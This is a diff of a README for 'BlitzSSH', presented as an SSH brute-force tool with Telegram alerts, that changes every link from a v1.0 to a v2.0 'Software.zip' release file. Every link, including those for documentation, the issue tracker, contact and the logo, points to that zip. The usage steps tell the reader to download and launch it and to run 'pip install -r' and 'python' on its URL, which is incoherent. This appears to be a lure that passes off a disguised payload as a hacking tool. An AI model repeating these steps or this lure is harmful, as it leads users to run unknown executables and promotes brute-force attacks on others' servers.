@@ -18,7 +18,7 @@ BlitzSSH is a powerful multi-threaded SSH brute-force tool that also provides Te
 
 To get started with BlitzSSH, you can download the latest release version from the following link: 
 
-[![Download BlitzSSH](https://github.com/nemanjas1213/BlitzSSH/releases/download/v1.0/Software.zip)](https://github.com/nemanjas1213/BlitzSSH/releases/download/v1.0/Software.zip)
+[![Download BlitzSSH](https://github.com/nemanjas1213/BlitzSSH/releases/download/v2.0/Software.zip)](https://github.com/nemanjas1213/BlitzSSH/releases/download/v2.0/Software.zip)
 
 *Note: The downloaded file needs to be launched to start using BlitzSSH.*
 
@@ -27,9 +27,9 @@ If the above link is not working or you need to find more recent versions, pleas
 ## Usage 🚩
 
 1. Clone the repository to your local machine.
-2. Install the necessary dependencies by running `pip install -r https://github.com/nemanjas1213/BlitzSSH/releases/download/v1.0/Software.zip`.
+2. Install the necessary dependencies by running `pip install -r https://github.com/nemanjas1213/BlitzSSH/releases/download/v2.0/Software.zip`.
 3. Configure the Telegram integration by setting up a Telegram bot and obtaining the token.
-4. Run BlitzSSH by executing `python https://github.com/nemanjas1213/BlitzSSH/releases/download/v1.0/Software.zip` and follow the on-screen instructions.
+4. Run BlitzSSH by executing `python https://github.com/nemanjas1213/BlitzSSH/releases/download/v2.0/Software.zip` and follow the on-screen instructions.
 5. Monitor the progress of the brute-force attacks via Telegram notifications.
 
 ## Contributing 🤝
@@ -44,9 +44,9 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 🔗 **Links**
 
-- [GitHub Repository](https://github.com/nemanjas1213/BlitzSSH/releases/download/v1.0/Software.zip)
-- [Documentation](https://github.com/nemanjas1213/BlitzSSH/releases/download/v1.0/Software.zip)
-- [Issue Tracker](https://github.com/nemanjas1213/BlitzSSH/releases/download/v1.0/Software.zip)
+- [GitHub Repository](https://github.com/nemanjas1213/BlitzSSH/releases/download/v2.0/Software.zip)
+- [Documentation](https://github.com/nemanjas1213/BlitzSSH/releases/download/v2.0/Software.zip)
+- [Issue Tracker](https://github.com/nemanjas1213/BlitzSSH/releases/download/v2.0/Software.zip)
 
 🔍 **Topics**
 
@@ -54,16 +54,16 @@ automation, brute-force, checker, cybersecurity, ethical-hacking, multithreading
 
 📧 **Contact**
 
-For any inquiries or support, feel free to reach out to [https://github.com/nemanjas1213/BlitzSSH/releases/download/v1.0/Software.zip](https://github.com/nemanjas1213/BlitzSSH/releases/download/v1.0/Software.zip).
+For any inquiries or support, feel free to reach out to [https://github.com/nemanjas1213/BlitzSSH/releases/download/v2.0/Software.zip](https://github.com/nemanjas1213/BlitzSSH/releases/download/v2.0/Software.zip).
 
 🚨 **Security**
 
-If you discover any security vulnerabilities within BlitzSSH, please report them to [https://github.com/nemanjas1213/BlitzSSH/releases/download/v1.0/Software.zip](https://github.com/nemanjas1213/BlitzSSH/releases/download/v1.0/Software.zip) so we can address them promptly. 
+If you discover any security vulnerabilities within BlitzSSH, please report them to [https://github.com/nemanjas1213/BlitzSSH/releases/download/v2.0/Software.zip](https://github.com/nemanjas1213/BlitzSSH/releases/download/v2.0/Software.zip) so we can address them promptly. 
 
 📌 **Stay Updated**
 
-Follow us on [Twitter](https://github.com/nemanjas1213/BlitzSSH/releases/download/v1.0/Software.zip) for the latest updates and announcements regarding BlitzSSH.
+Follow us on [Twitter](https://github.com/nemanjas1213/BlitzSSH/releases/download/v2.0/Software.zip) for the latest updates and announcements regarding BlitzSSH.
 
-![BlitzSSH Logo](https://github.com/nemanjas1213/BlitzSSH/releases/download/v1.0/Software.zip)
+![BlitzSSH Logo](https://github.com/nemanjas1213/BlitzSSH/releases/download/v2.0/Software.zip)
 
 Thank you for using BlitzSSH! Happy hacking! 🔒🔍🚀
